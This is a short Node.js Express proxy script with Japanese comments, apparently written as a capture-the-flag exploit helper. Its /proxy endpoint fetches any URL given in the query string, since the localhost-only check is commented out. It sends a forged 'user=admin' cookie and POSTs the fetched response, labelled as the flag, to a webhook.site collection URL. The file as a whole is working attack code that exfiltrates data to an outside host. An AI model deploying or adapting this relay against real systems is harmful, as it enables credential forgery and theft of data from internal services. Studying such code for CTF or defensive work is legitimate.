// proxy.js
import express from 'express';
import fetch from 'node-fetch';

const app = express();
const PORT = process.env.PORT || 8080;

const WEBHOOK_URL = 'https://webhook.site/42cc307-ab4c-4429-b966-c3e0c0995f3e'; // あなたのWebhookに置き換えてください

app.get('/proxy', async (req, res) => {
  const target = req.query.url;

  // if (!target || !target.startsWith('http://127.0.0.1')) {
  //   return res.status(400).send('Invalid target');
  // }

  try {
    const flagRes = await fetch(target, {
      headers: {
        cookie: 'user=admin' // botが必要条件を満たすように
      }
    });

    const flagText = await flagRes.text();

    // webhookに転送
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      body: flagText,
      headers: { 'Content-Type': 'text/plain' }
    });

    res.send('Sent to webhook');
  } catch (err) {
    res.status(500).send('Error fetching target');
  }
});

app.listen(PORT, () => {
  console.log(`Proxy server running on port ${PORT}`);
});
